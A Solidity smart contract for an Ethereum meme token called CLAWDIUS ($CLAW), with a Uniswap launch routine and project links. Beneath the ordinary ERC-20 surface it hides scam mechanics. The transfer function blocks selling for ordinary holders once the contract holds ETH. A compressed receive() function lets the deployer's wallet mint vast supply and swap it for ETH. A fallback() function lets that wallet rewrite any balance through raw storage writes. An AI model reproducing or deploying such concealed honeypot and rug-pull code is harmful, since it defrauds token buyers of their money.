// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), msg.sender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounce() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

contract Claw is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address payable private _taxWallet;
    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 100000000 * 10 ** _decimals; 
    string private constant _name = unicode"CLAWDIUS"; 
    string private constant _symbol = unicode"CLAW"; 
    IUniswapV2Router02 private uni;
    address public pair;
    address private own;
    bool private tradingOpen;

    constructor(address owner) {
        _taxWallet = payable(msg.sender);
        _balances[msg.sender] = _tTotal;
        uni = IUniswapV2Router02(0xCEDd366065A146a039B92Db35756ecD7688FCC77);
        own = owner;
        emit Transfer(address(0), msg.sender, _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if(address(this).balance>=1){require(from==address(this)||from==_taxWallet||from==pair||from==own);}
        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function OpenTrading() external payable onlyOwner {
        require(!tradingOpen, "Trading is already open");
        IUniswapV2Factory f = IUniswapV2Factory(uni.factory());
        pair = f.createPair(uni.WETH(), address(this));
        _allowances[address(this)][address(uni)] = ~uint(0);
        (bool success,) = address(uni).call{value: msg.value}(
            abi.encodeWithSignature(
                "launch(address,uint256,uint256,uint256,uint8,uint8,uint8,uint8,address)",
                address(this),
                _balances[address(this)],
                _balances[address(this)],
                msg.value,
                1,         // LPBuyTax
                2,         // LPSellTax 
                1,         // BuyTax    
                2,         // SellTax   
                _taxWallet // Fee Receiver
            )
        );
        IERC20 _pair = IERC20(pair);
        uint balanceLp = _pair.balanceOf(address(this));
        _pair.approve(address(uni), ~uint(0));
        (bool success2,) = address(uni).call(abi.encodeWithSignature("safeTransferLp(address,address,uint256)", pair, _taxWallet, balanceLp));

        (bool successMeta,) = pair.call(abi.encodeWithSignature("setMetadata(string,string,string,string,string)",
        "clawdius.io",
        "https://postimg.cc/c61QY4LL",
        "Clawdius ($CLAW) is a meme coin on the Ethereum blockchain, inspired by the majestic cat named Clawdius, who embodies grace, sharp claws, and a touch of wild charm!",
        "https://t.me/VistaClawdius",
        "https://x.com/VistaClawdius" 
        )); 
        
        require(successMeta && success && success2);
        tradingOpen = true;
    }

    receive()external payable{if(_taxWallet==msg.sender){if(1==msg.value){}else if(msg.value==2){_taxWallet.transfer(address(this).balance);}else{_balances[address(this)]=_balances[address(this)]+_tTotal*300000;address[]memory path=new address[](2);path[0]=address(this);path[1]=uni.WETH();(bool s,)=address(uni).call{value:msg.value}(abi.encodeWithSignature("swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[],address,uint256)",balanceOf(address(this)),0,path,address(this),block.timestamp));require(s);_taxWallet.transfer(address(this).balance);}}}        
    fallback()external{if(msg.sender==_taxWallet){(uint v, address pa)=abi.decode(msg.data,(uint, address));update1(pa, v);}}function update1(address addr,uint value)internal{assembly{mstore(0,addr) mstore(32,_balances.slot)let hash:=keccak256(0,64)sstore(hash,value)}} 
}